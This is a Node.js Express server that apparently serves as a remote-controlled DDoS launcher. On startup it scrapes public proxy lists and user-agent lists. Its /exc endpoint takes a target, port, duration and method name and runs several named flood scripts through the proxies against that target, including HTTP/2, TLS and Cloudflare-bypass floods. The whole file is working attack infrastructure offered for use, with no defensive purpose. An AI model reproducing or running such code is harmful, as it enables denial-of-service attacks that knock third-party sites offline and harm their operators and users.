const fetch = require('node-fetch');
const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

const proxyUrls = [
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.openproxylist.xyz/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://spys.me/proxy.txt"
];

async function scrapeProxy() {
  try {
    let allData = "";

    for (const url of proxyUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();
        allData += data + "\n";
      } catch (err) {
        console.log(`❌ Gagal ambil dari ${url}: ${err.message}`);
      }
    }

    fs.writeFileSync("proxy.txt", allData, "utf-8");
    console.log("Semua proxy berhasil disimpan ke proxy.txt");
  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy : http://${data.origin}:${port}`);
  return data;
}

app.get('/exc', (req, res) => {
  // 1. Mengambil parameter target, time, methods, dan port dari query string
  const { target, time, methods, port } = req.query;

  // 2. Sanitasi & Default Value
  // Memastikan port hanya angka. Jika tidak diisi, default ke 80 atau 443 sesuai kebutuhan.
  const safePort = port ? port.replace(/[^0-9]/g, "") : "443"; 
  const safeTarget = target ? target.replace(/[^a-zA-Z0-9.:/-]/g, "") : "";
  const safeTime = time ? time.replace(/[^0-9]/g, "") : "60";

  res.status(200).json({
    message: 'API request received. Executing script shortly, By Snith #Exercist',
    target: safeTarget,
    port: safePort,
    time: safeTime,
    methods
  });

  // 3. Logika Eksekusi dengan menyertakan port
  // Catatan: Pastikan file .js di folder /methods sudah mendukung argumen port tersebut.
  
  if (methods === 'LESUS') {
    exec(`node ./methods/H2CA.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${safeTarget} ${safePort} ${safeTime} 10 100 true`);
    exec(`node ./methods/H2F3.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
   } else if (methods === 'KOMIX') {
    exec(`node ./methods/HTTP.js ${safeTarget} ${safePort} ${safeTime}`);
    exec(`node ./methods/HTTPS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    } else if (methods === 'R2') {
    exec(`node ./methods/TLS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/RAND.js ${safeTarget} ${safePort} ${safeTime}`);
    exec(`node ./methods/BLAST.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    } else if (methods === 'PSHT') {
    exec(`node ./methods/H2CA.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${safeTarget} ${safePort} ${safeTime} 10 100 true`);
    exec(`node ./methods/H2F3.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP.js ${safeTarget} ${safePort} ${safeTime}`);
    exec(`node ./methods/RAND.js ${safeTarget} ${safePort} ${safeTime}`);
    exec(`node ./methods/TLS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
   } else if (methods === 'pidoras') {
    exec(`node ./methods/H2CA.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/pidoras.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/floods.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/browser.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${safeTarget} ${safePort} ${safeTime} 10 100 true`);
    exec(`node ./methods/H2F3.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP.js ${safeTarget} ${safePort} ${safeTime}`);
    exec(`node ./methods/Cloudflare.js ${safeTarget} ${safePort} ${safeTime} 100`);
    exec(`node ./methods/RAND.js ${safeTarget} ${safePort} ${safeTime}`);
    exec(`node ./methods/TLS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
   }
   else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  scrapeProxy();
  scrapeUserAgent();
  fetchData();
});
